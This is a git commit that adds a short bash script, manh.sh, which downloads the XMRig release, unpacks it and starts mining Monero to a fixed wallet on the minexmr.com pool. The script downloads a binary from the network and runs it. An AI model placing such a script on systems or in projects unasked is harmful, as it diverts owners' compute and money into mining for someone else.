9f82ad1b6e8cfaa9fa962c43d680e484172730a9
bergman9606 <50274107+bergman9606@users.noreply.github.com>
2020-07-14 10:31:29 +0800

    Create manh.sh

---
+++ manh.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+wget https://github.com/xmrig/xmrig/releases/download/v6.2.3/xmrig-6.2.3-xenial-x64.tar.gz
+tar xfvz xmrig-6.2.3-xenial-x64.tar.gz
+cd xmrig-6.2.3
+./xmrig --donate-level 1 -o ca.minexmr.com:443 -u 83gi91MmJVgMxBLLjw7C2U9NaZXmLCsQh85hBbx4qgQR629aozXUi1vPZiiRgpx2jLDoskMVYMA7BWyVPkeAN7eGV5d6MnS --rig-id csd -k --tls
